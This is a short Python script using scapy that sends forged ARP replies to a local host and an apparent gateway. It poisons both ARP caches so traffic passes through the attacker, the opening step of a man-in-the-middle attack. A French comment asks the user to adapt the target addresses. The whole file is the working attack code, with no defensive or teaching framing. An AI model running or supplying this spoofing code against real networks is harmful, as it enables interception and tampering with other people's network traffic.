#!/usr/bin/env python3
# coding:utf8
import scapy.all as scapy
from scapy.layers.l2 import Ether, ARP


def get_mac(target_ip):
    try:
        arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=target_ip)
        mac = scapy.srp(arp_packet, timeout=1)[0][0][1].hwsrc
        return mac
    except Exception as e:
        print(str(e))


def spoof_arp(target_ip, target_mac, source_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip)
    scapy.send(packet)


spoof_arp("192.168.0.30", get_mac("192.168.0.30"), "192.168.0.254")  # à adapter
spoof_arp("192.168.0.254", get_mac("192.168.0.254"), "192.168.0.30")  # à adapter
